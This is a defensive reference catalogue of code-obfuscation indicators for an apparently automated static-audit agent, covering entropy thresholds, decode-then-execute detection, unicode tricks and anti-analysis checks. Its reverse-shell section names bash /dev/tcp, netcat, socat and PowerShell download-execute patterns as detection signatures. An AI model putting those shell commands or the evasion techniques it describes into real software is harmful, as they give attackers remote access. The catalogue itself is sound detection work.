# Obfuscation Pattern Catalogue

A reference list of obfuscation indicators used by malicious code to hide payloads from static review. The `auditor-static` sub-agent uses this catalogue together with the obfuscation scan helper to surface findings.

## Why obfuscation matters

Legitimate code rarely needs to encode logic at runtime. When a repository decodes a blob and feeds it to a shell or interpreter, the static reviewer cannot see what the program actually does. Obfuscation is therefore treated as a high-concern finding even when the decoded payload turns out to be benign — the act of hiding intent is itself a red flag.

## Signal categories

### 1. High-entropy text blocks

A block of consecutive base64, base32 or hex characters of 64 bytes or more with high Shannon entropy is a strong indicator of an embedded payload. The threshold is 64 (not 256): a stager or loader payload fits in far fewer characters than a full script, so a 256-char floor let short payloads through. The entropy gate (4.0 bits/char for the base alphabets, 3.2 for hex) keeps prose and identifiers out.

The hex gate alone does not exclude checksums: a sha256 digest is 64 hex chars with entropy around 3.8, above the 3.2 floor. The helper therefore skips a hex-only blob whose length is a known digest width (40 / 64 / 128) when the line names a hash (`sha1`, `sha256`, `sha512`, `integrity`, `checksum`, `digest`, `hash`) or the blob is a git-style pin immediately preceded by `@`. This is applied before the base64 pass too, since a 64-hex run is also a valid base64 alphabet run. Legitimate digest pinning (Docker `@sha256:`, action SHAs, lockfile `integrity`) is expected and stays `OK`.

The obfuscation helper reports lines that exceed the threshold. The agent then reads the surrounding context to decide:

- Block is followed by a runtime decode call → `FAIL`.
- Block is in a test fixture (`tests/`, `fixtures/`, `__snapshots__/`) and clearly a test asset → `OK`.
- Block is in source with no decode call nearby → `CAUTION` (worth investigating but not immediately malicious).

### 2. Runtime decode followed by execution

Any sequence where:

- A blob is decoded with `base64.b64decode`, `base64.b32decode`, `binascii.unhexlify`, `bytes.fromhex`, `zlib.decompress`, `lzma.decompress`, `gzip.decompress`, the Node `Buffer.from(..., 'base64')`, the browser `atob`, `String.fromCharCode`, or a raw `bytes([...])` byte-list literal.
- The decoded value is fed to a shell call (any process-spawn helper from Python, Node, or shell), to a runtime interpreter (`runpy`, `compile`), or to a similar dynamic-evaluation primitive.

This combination is `FAIL`. The decoded result need not be inspected; the pattern itself is the finding.

The helper detects this **both on a single line and across lines in the same file**: a decode followed by an `exec`/`eval`/`system`/`spawn` within a 25-line window is reported as `decode_exec_multiline`. The window bounds the pairing in both directions, so an unrelated decode and execution at opposite ends of a large file do not chain into a false positive. Splitting the decode and the execution onto separate statements is a common evasion of a naive same-line grep and does not evade this pass.

Two narrowings avoid common false positives: the execution match for `compile(` excludes the stdlib pattern-compilers `re.compile` and `regex.compile` (a module-qualified `builtins.compile` is still caught), and the `bytes([...])` decode primitive requires a numeric byte-list of at least eight elements so an ordinary `bytes([0])` is not read as a payload builder.

### 3. String concatenation to hide commands

- A single shell command split across many string concatenations to evade grep.
- A reverse-shell signature reconstructed from variables (e.g., a script that builds the literal `bash` plus `-i` from individual fragments).
- Whitespace or unicode-confusable characters inserted to break naive grep.

These are `CAUTION` minimum, escalating to `FAIL` if the reconstructed command matches a high-concern pattern.

### 4. Encoded shell in configuration files

YAML or JSON configs sometimes carry base64-encoded shell scripts that are decoded by an installer:

- `entrypoint: !!binary <base64>` in a YAML.
- A `script` field whose value decodes to shell.
- A `cloud-init` or `ignition` block with base64 user data.

Any encoded shell in configuration is `FAIL` regardless of decode location, because configuration is a trust boundary.

### 5. Source-code minification masquerading as source

- A "source" file that is actually minified JavaScript with random identifiers.
- A "source" file that is a single long line longer than 5000 characters.
- A "source" file with no comments, no whitespace, and structurally identical to known minifier output.

These are `CAUTION` (provenance unclear). If the repository ships only the minified version with no original alongside, escalate to `FAIL`.

### 6. Unicode tricks

- Right-to-left override (`U+202E`), zero-width characters (`U+200B`, `U+200C`, `U+200D`, `U+FEFF`) embedded in identifiers or string literals → `CAUTION`.
- Confusable characters (Cyrillic letters that look like Latin) used in package names, URLs, or function names → `FAIL`.
- Bidi control characters near security-relevant code → `FAIL` (Trojan Source attack).

### 7. Reverse-shell signatures

The classic patterns:

- `bash -i >& /dev/tcp/<host>/<port>`
- `nc -e /bin/sh <host> <port>` and variants with `bash`
- A Python one-liner that combines socket, process-spawn, and OS modules to spawn an interactive shell back to a remote host.
- A Perl one-liner that uses Socket and dups STDIN/STDOUT to a network connection.
- `socat exec:/bin/sh openssl-connect:...`
- PowerShell `Invoke-Expression` over a `New-Object System.Net.WebClient` download.

All are `FAIL`.

### 8. Anti-debug / anti-analysis

- `sys.gettrace()`, `Thread.currentThread().isDaemon()` checks.
- Detection of common debuggers (`gdb`, `lldb`, `pdb`, `delve`).
- Detection of hypervisors via `cpuid` calls or `dmidecode`.
- Self-modifying code (writes to its own source file at runtime).

Each is `CAUTION` minimum, `FAIL` when paired with branch-on-detection that changes behaviour.

## How the obfuscation helper works

The script:

1. Walks the repo, excluding `node_modules/`, `vendor/`, `.git/`, `dist/`, `build/`, lockfiles.
2. For each text file, scans line by line for runs of base64, base32, and hex alphabet characters of length at least 64.
3. Computes Shannon entropy on those runs; flags entropy at or above 4.0 bits/char (base alphabets) or 3.2 bits/char (hex) as suspicious.
4. Detects the runtime-decode-then-execute pattern both same-line and across lines within one file (decode into a variable, execute the variable later).
5. Greps for the reverse-shell signatures.
6. Outputs one line per finding: `<path>:<line>:<category>:<short reason>`.

The agent reads the report, then opens the relevant files to add context (does the decode feed a shell? is this a test fixture?) before classifying severity.
